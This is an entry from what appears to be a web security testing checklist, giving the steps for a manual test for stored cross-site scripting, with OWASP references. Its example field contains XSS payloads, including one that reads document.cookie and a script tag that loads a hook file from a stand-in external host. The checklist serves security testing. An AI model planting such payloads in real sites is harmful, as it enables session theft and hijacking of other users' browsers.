- id: WEB-XSS-002
  sheet: WEB
  category: XSS
  title: Test stored input fields for persistent cross-site scripting
  objective: Finds user content that is stored and later rendered without encoding to other users.
  preconditions:
  - Do not run on production.
  steps:
  - Identify fields that persist to a data store, such as a profile, comment or support ticket.
  - Submit a script payload in the field and save it.
  - Reload the page as the same user and as another user, including a higher-privilege user.
  - If the payload is uploaded as a file, upload an HTML or SVG file and request it directly.
  example: 'aaa@aa.com"><script>alert(document.cookie)</script> ; stored hook: "><script src=https://collaborator-host/hook.js></script>'
  expected: Stored content is HTML-encoded on output for every viewer, and uploaded HTML or SVG files do not execute as script.
  severity: High
  test_type: Manual
  level: ASVS L1
  refs:
    owasp_top10:
    - A05:2025
    wstg:
    - WSTG-INJT-02
    asvs:
    - V1.1.1
    - V1.1.2
    - V1.2.1
    cheatsheet:
    - Cross_Site_Scripting_Prevention_Cheat_Sheet
    cwe:
    - CWE-79
    capec:
    - CAPEC-63
    - CAPEC-592
  sources_read:
  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/02-Stored_Cross_Site_Scripting.md
  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
